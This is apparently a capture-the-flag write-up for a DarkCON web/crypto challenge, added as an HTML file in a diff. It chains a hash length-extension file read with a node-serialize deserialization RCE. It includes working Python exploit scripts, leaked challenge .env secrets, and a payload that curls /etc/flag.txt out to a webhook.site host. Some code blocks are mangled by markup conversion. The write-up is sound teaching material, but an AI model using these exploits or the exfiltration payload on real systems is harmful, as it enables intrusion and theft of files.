@@ -1,0 +1,145 @@
+<h1>Web+Crypto (3 solves / 498 points)</h1>
+
+<p>Made this website where you can read files 
+Note: Flag at /etc/flag.txt</p>
+
+<h2>Soure Code:</h2>
+
+<ul>
+<li><a href="https://github.com/karma9874/My-CTF-Challenges/tree/main/DarkCON-ctf/Misc/Web%2BCrypto">Source Code</a></li>
+</ul>
+
+<h2>TL;DR</h2>
+
+<p>/readfile is vulnerable to length extension attack, so read source file of web app and exploiting the node-deserialization attack</p>
+
+<h2>Solution</h2>
+
+<p>So from webpage source code we see that there are total 3 funionality of the web app registration,login,readfile</p>
+
+<p>After login we get token using that token to readfile we can read the <code>68696e742e747874</code> (hex decode as hint.txt)</p>
+
+<p><code>bash
+root@KARMA:/# curl -XPOST -H "Content-Type: application/json" -d '{"username":"karma","password":"karma"}' http://web-crypto.darkarmy.xyz/login
+{"token":"eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4="}
+</code></p>
+
+<p><code>bash
+root@KARMA:/# curl -XPOST -H "Content-Type: application/json" -d '{"token": "eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4=", "filename": "68696e742e747874", "sig":"e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01"}' http://web-crypto.darkarmy.xyz/readfile
+{"filedata":"Implementing MAC and adding cheese to it pfftt...easy,btw cheese length is less than 30 chars xD\n"}
+</code></p>
+
+<p><code>Implementing MAC and adding cheese to it and cheese length is less than 30 chars</code>  -> this suggest it to length extension attack with password length less than 30 chars given</p>
+
+<p>Web app is running on nodejs so <code>package.json</code> must be present on the system</p>
+
+<p>We get the contents of package.json at <code>22</code> so password length is <code>22</code></p>
+
+<p>```py
+import hashpumpy
+import requests
+import json
+import binascii
+for i in range(1,30):
+  sig,inp = hashpumpy.hashpump("e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01","hint.txt","/../package.json",i)
+  filename = binascii.hexlify(inp).decode()
+  url = 'http://web-crypto.darkarmy.xyz/readfile'
+  myobj = {"token": "eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4=","filename":filename,"sig":sig}
+  x = requests.post(url, data = json.dumps(myobj),headers ={"Content-Type":"application/json"})
+  print(x.text)</p>
+
+<h1>response</h1>
+
+<h1>{"filedata":"{\n  \"name\": \"web_crypto\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"test\": \"echo \\"Error: no test specified\\" &amp;&amp; exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"body-parser\": \"^1.19.0\",\n    \"dotenv\": \"^8.2.0\",\n    \"ejs\": \"^3.1.5\",\n    \"express\": \"^4.17.1\",\n    \"mysql\": \"^2.18.1\",\n    \"node-serialize\": \"0.0.4\",\n    \"cluster\": \"^0.7.7\"\n  }\n}\n"}</h1>
+
+<p>``<code>
+From the response we can also read the</code>app.js<code>which leads to the file</code>/models/User.js` </p>
+
+<p><code>node-serialize</code> is used in User.js for creating the user specific <code>token</code></p>
+
+<p>```js
+encrypter(user) {
+    var shasum = crypto.createHmac('sha1',process.env.AUTH_SECRET);
+    var data = Buffer.from(serialize.serialize(user)).toString('base64') 
+    return data+"--"+shasum.update(data).digest('base64'); 
+    }</p>
+
+<p>decrypter(token) {
+    return new Promise(function(resolve,reject){
+    var data = token.split("--")
+    var shasum = crypto.createHmac('sha1',process.env.AUTH_SECRET);
+    if(data[1] === shasum.update(data[0]).digest('base64')){
+        try{
+          return resolve(serialize.unserialize(Buffer.from(data[0], 'base64').toString()))
+        }catch(err){
+          return reject(err.message);
+        }
+    }else{
+      return reject("Trying to hack? lol")
+    }});
+  }
+````</p>
+
+<p>A little bit of google search for <code>node-serialize</code> leads to that the npm package is vulnerable to node-deserialization rce attack </p>
+
+<p><code>js
+app.post('/readfile',(req,res)=&gt;{
+  var token = req.body.token
+  var sig = req.body.sig
+  var name = req.body.filename
+  console.log(token+sig+name)
+  if(token &amp;&amp; sig &amp;&amp; name){
+    var userobj = new User().decrypter(token).then(function(obj){
+      filename = Buffer.from(name,'hex').toString('binary')
+      new User().access_file(filename,sig).then(function(data){
+        res.json({"filedata":data})
+      }).catch(function(err){
+        res.json({"err":err})
+      })
+    }).catch(function(err){
+        res.json({"err":err})
+      });
+  }else{
+    res.json({"err":"Invalid request"})
+  }
+});
+</code></p>
+
+<p>And from <code>readfile</code> route we can check that the app first verifies the token and then forwards it to <code>decrypter</code> function which calls the <code>unserialize</code> function which can give rce</p>
+
+<p>So for that to work we need to sign our payload with valid signature, so the AUTH_SECRET is comming from .env file which we can easily read it</p>
+
+<p>.env file
+<code>
+DB_HOST=wc_mysql
+DB_USER=root
+DB_NAME=scam
+nDB_PASS=scammer@123
+HASH_SECRET=testingallthewayintoit
+AUTH_SECRET=abhikliyekuchbhitestingkar
+</code></p>
+
+<p>Solution Script
+```py
+from hashlib import sha1
+import hmac
+import requests</p>
+
+<h1>{"rce":"<em>$$ND</em>FUNC$$<em>function (){require('child</em>process').exec('curl -XPOST --data-binary \"@/etc/flag.txt\" https://webhook.site/eb800bdc-e7a9-4765-852b-1a6513b56f4d', function(error, stdout, stderr) { console.log(stdout)});}()"}</h1>
+
+<p>raw = "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLVhQT1NUIC0tZGF0YS1iaW5hcnkgXCJAL2V0Yy9mbGFnLnR4dFwiIGh0dHBzOi8vd2ViaG9vay5zaXRlL2ViODAwYmRjLWU3YTktNDc2NS04NTJiLTFhNjUxM2I1NmY0ZCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpfSk7fSgpIn0="</p>
+
+<p>key = "abhikliyekuchbhitestingkar"
+hashed = hmac.new(key, raw, sha1)
+payload<em>token = hashed.digest().encode('base64')
+url = 'http://web-crypto.darkarmy.xyz/readfile'
+myobj = {"token": payload</em>token,"filename":"68696e742e747874","sig":"e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01"}
+x = requests.post(url, data = json.dumps(myobj),headers ={"Content-Type":"application/json"})
+print(x.text)
+```</p>
+
+<h2>Flag</h2>
+
+<blockquote>
+  <p>darkCON{l3ngth<em>3xt3ns10n</em>2<em>n0d3</em>s3r1411z3<em>brrrrr</em>xD}</p>
+</blockquote>
